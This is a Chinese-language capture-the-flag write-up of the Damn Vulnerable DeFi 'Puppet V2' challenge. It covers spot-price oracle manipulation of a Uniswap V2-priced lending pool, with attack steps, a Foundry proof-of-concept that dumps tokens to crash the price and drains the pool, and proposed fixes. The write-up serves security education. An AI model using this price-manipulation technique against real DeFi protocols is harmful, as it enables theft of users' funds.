# Puppet V2 漏洞分析

## 1. 合约功能概述

`PuppetV2Pool` 是 `Puppet` 的升级版本：改用 Uniswap V2 作为价格来源，抵押资产从 ETH 改成 WETH。

**核心组件：**
- **PuppetV2Pool.sol**: 借贷池，按 Uniswap V2 储备计算 DVT 对 WETH 报价
- **UniswapV2Library.sol**: 官方报价工具库（`getReserves` + `quote`）
- **PuppetV2.t.sol**: 关卡测试（玩家 20 ETH + 10000 DVT，池子 1,000,000 DVT）

**业务流程：**
1. 计算借款所需 WETH 抵押：`deposit = quote(tokenAmount) * 3 / 1e18`
2. 价格来自 Uniswap V2 的当前储备比例
3. 借款时通过 `transferFrom` 拉取用户 WETH

---

## 2. 漏洞位置

### 漏洞代码（PuppetV2Pool.sol）

```solidity
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    uint256 depositFactor = 3;
    // ⚠️ 抵押要求完全依赖当前 AMM 报价
    return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
}

function _getOracleQuote(uint256 amount) private view returns (uint256) {
    // 从 V2 pair 读取当前 reserves
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    // ⚠️ 用“当前储备比例”线性报价，仍是可被交易即时影响的价格
    return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
}
```

### 漏洞本质

与 V1 的本质一致：
- 价格仍来自单池现货（当前 reserves）
- 没有时间平滑/多源校验/异常保护
- 因此可先通过大额 swap 操纵价格，再按被操纵价格借款

---

## 3. 漏洞原理分析

### 3.1 相比 V1 有哪些变化

- 从 Uniswap V1 换成 V2（实现更现代）
- 抵押从 ETH 变成 WETH（需要 `deposit` 与 `approve`）
- 抵押系数从 2x 提升到 3x

但这些改动都没有消除核心问题：**oracle 仍是可操纵现货价**。

### 3.2 关卡可利用性

测试初始条件：
- Uniswap: `100 DVT / 10 WETH`
- 玩家: `10000 DVT + 20 ETH`
- 池子: `1,000,000 DVT`

玩家持有的 DVT 远超池子流动性，可通过 `swapExactTokensForETH` 把 DVT 价格压到很低，
使借空池子的 WETH 抵押从极大值降到可承受范围。

### 3.3 攻击步骤

1. 批准 Router 使用玩家全部 DVT
2. `swapExactTokensForETH` 抛售 10000 DVT，压低 DVT 价格
3. 把玩家 ETH 全部包装为 WETH 并授权给借贷池
4. 以低抵押借走池子全部 DVT，转入 `recovery`

---

## 4. 修复方案

### 方案一：改用 TWAP 或外部预言机（推荐）

- 不直接信任当前储备价
- 使用足够长窗口的 TWAP 或 Chainlink

### 方案二：引入防操纵机制

- 报价偏离阈值（与参考价偏离过大即拒绝）
- 借款速率限制与单笔上限
- 高风险时段提高抵押率

### 方案三：多市场聚合

- 聚合多个 DEX / 预言机报价
- 采用中位数或去极值均值

---

## 5. Proof of Concept（关键代码）

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    // 1) 授权 Router 使用玩家 DVT
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);

    // 2) 大额卖出 DVT，压低 DVT/WETH 价格
    uniswapV2Router.swapExactTokensForETH({
        amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
        amountOutMin: 0,
        path: path,
        to: player,
        deadline: block.timestamp
    });

    // 3) 把 ETH 包装为 WETH，供借贷池扣押抵押
    weth.deposit{value: player.balance}();
    weth.approve(address(lendingPool), type(uint256).max);

    // 4) 借空池子并转到 recovery
    uint256 borrowAmount = token.balanceOf(address(lendingPool));
    lendingPool.borrow(borrowAmount);
    token.transfer(recovery, borrowAmount);
}
```

---

## 6. 总结

`Puppet V2` 的升级主要是工程层面的（V2 + WETH），而不是风控层面的。

只要借贷价格仍锚定可即时操纵的 AMM 现货，攻击者依旧能通过“先交易造价，再按假价借款”实现抽干池子。
